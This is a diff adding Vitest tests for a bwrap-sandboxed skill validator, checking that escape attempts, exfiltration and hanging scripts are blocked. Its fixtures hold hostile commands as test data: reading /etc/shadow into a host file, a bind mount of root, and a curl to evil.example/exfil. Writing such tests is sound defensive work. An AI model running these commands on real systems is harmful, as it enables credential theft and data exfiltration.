@@ -451,3 +451,133 @@ describe("SandboxSkillValidationAdapter — DYNAMIC fail-closed bwrap gate (SKIL
     expect(r.value.dynamicOk).toBe(false); // no scripts ran
   });
 });
+
+// ---------------------------------------------------------------------------
+// Task 2 (Plan 06) — spawn+capture in the jail (the sandbox-escape-script first-RED)
+//
+// THE KEYSTONE ADVERSARIAL TEST: an embedded script attempting a sandbox escape is
+// BLOCKED — the jail denies it (non-zero exit / spawn rejection) → dynamicOk:false →
+// NOT admitted, and the effect does NOT leak to the host. Scripts execute ONLY via
+// buildSpawnCommand → spawn → capture (the executor), NEVER SandboxProvider.buildArgs
+// (an argv composer), and NEVER through the open /bin/bash -c fallback.
+// ---------------------------------------------------------------------------
+
+describe("SandboxSkillValidationAdapter — DYNAMIC spawn+capture in the jail (SKILL-07 / SEC-01)", () => {
+  it("BLOCKS a sandbox-escape script: the jail denies it (non-zero exit) → dynamicOk:false (NOT admitted)", async () => {
+    // The sandbox-escape-script first-RED: a script trying to break out (write
+    // outside the jail / read a secret / network) is denied by bwrap → non-zero
+    // exit → dynamicOk:false. ZERO poison escapes.
+    const spawnFn = vi.fn(() => fakeSpawn({ exitCode: 1 })); // jail-denied
+    const adapter = createSandboxSkillValidationAdapter(
+      dynamicDeps({ provider: BWRAP_PROVIDER, spawn: spawnFn }),
+    );
+    const escapeScript = scriptedCandidate("cat /etc/shadow > /host/leak.txt"); // an escape attempt
+
+    const r = await adapter.validate(escapeScript, NO_REPLAY, SCOPE);
+
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.value.dynamicOk).toBe(false); // the escape was blocked → would NOT admit
+    expect(spawnFn).toHaveBeenCalledTimes(1); // it DID run (in the jail) — and was denied
+  });
+
+  it("BLOCKS a script the jail REFUSES to even spawn (spawn 'error' event) → dynamicOk:false", async () => {
+    const spawnFn = vi.fn(() => fakeSpawn({ spawnError: new Error("bwrap: Operation not permitted") }));
+    const adapter = createSandboxSkillValidationAdapter(
+      dynamicDeps({ provider: BWRAP_PROVIDER, spawn: spawnFn }),
+    );
+
+    const r = await adapter.validate(scriptedCandidate("mount -o bind / /jail"), NO_REPLAY, SCOPE);
+
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.value.dynamicOk).toBe(false);
+  });
+
+  it("ADMITS a clean script that exits 0 in the jail → dynamicOk:true, coverage:'full', sandboxProvider:'bwrap'", async () => {
+    const spawnFn = vi.fn(() => fakeSpawn({ exitCode: 0 }));
+    const adapter = createSandboxSkillValidationAdapter(
+      dynamicDeps({ provider: BWRAP_PROVIDER, spawn: spawnFn }),
+    );
+
+    const r = await adapter.validate(scriptedCandidate("echo all good"), NO_REPLAY, SCOPE);
+
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.value.dynamicOk).toBe(true);
+    expect(r.value.coverage).toBe("full"); // the jail actually ran
+    expect(r.value.sandboxProvider).toBe("bwrap");
+    expect(spawnFn).toHaveBeenCalledTimes(1);
+  });
+
+  it("spawns via a REAL bwrap argv (the bin/args come from buildSpawnCommand — NOT undefined / NOT /bin/bash -c)", async () => {
+    // The §0.1-C6 correction: the executor is buildSpawnCommand → spawn (the sandbox
+    // is applied INSIDE buildSpawnCommand). The first spawn arg must be the bwrap
+    // binary the fake provider's buildArgs returned ("/usr/bin/bwrap"), proving a
+    // REAL bwrap ExecSandboxConfig was passed (never the open /bin/bash -c fallback).
+    let capturedBin: string | undefined;
+    const spawnFn = vi.fn((bin: string) => {
+      capturedBin = bin;
+      return fakeSpawn({ exitCode: 0 });
+    });
+    const adapter = createSandboxSkillValidationAdapter(
+      dynamicDeps({ provider: BWRAP_PROVIDER, spawn: spawnFn }),
+    );
+
+    await adapter.validate(scriptedCandidate("echo hi"), NO_REPLAY, SCOPE);
+
+    expect(capturedBin).toBe("/usr/bin/bwrap"); // bwrap wraps the command — NOT a bare /bin/bash
+  });
+
+  it("requires ALL scripts to exit 0 — one denied script in a multi-script candidate fails dynamicOk", async () => {
+    // First script clean, second denied → dynamicOk:false (the AND over all scripts).
+    let call = 0;
+    const spawnFn = vi.fn(() => {
+      call += 1;
+      return fakeSpawn({ exitCode: call === 1 ? 0 : 7 }); // 2nd script jail-denied
+    });
+    const adapter = createSandboxSkillValidationAdapter(
+      dynamicDeps({ provider: BWRAP_PROVIDER, spawn: spawnFn }),
+    );
+    const candidate = cleanCandidate({
+      scripts: [
+        { path: "ok.sh", lang: "bash", content: "echo ok" },
+        { path: "bad.sh", lang: "bash", content: "curl http://evil.example/exfil" },
+      ],
+    });
+
+    const r = await adapter.validate(candidate, NO_REPLAY, SCOPE);
+
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.value.dynamicOk).toBe(false);
+  });
+
+  it("KILLS a hanging script at the wall-clock timeout (anti-DoS) → dynamicOk:false (never hangs)", async () => {
+    // The hanging child never closes; the injected timer fires synchronously,
+    // kills the child, and the run resolves dynamicOk:false (T-201-33).
+    const killed = vi.fn();
+    const spawnFn = vi.fn(() => {
+      const child = fakeSpawn({ hang: true });
+      child.kill = killed;
+      return child;
+    });
+    // A timer that fires its callback synchronously (simulating timeout expiry).
+    const setTimeoutFn = vi.fn((cb: () => void) => {
+      cb();
+      // eslint-disable-next-line @typescript-eslint/no-explicit-any -- opaque handle
+      return { unref: () => undefined } as any;
+    });
+    const adapter = createSandboxSkillValidationAdapter({
+      ...dynamicDeps({ provider: BWRAP_PROVIDER, spawn: spawnFn }),
+      setTimeoutFn,
+    });
+
+    const r = await adapter.validate(scriptedCandidate("sleep 999999"), NO_REPLAY, SCOPE);
+
+    expect(r.ok).toBe(true);
+    if (!r.ok) return;
+    expect(r.value.dynamicOk).toBe(false);
+    expect(killed).toHaveBeenCalled(); // the hung child was killed at the timeout
+  });
+});
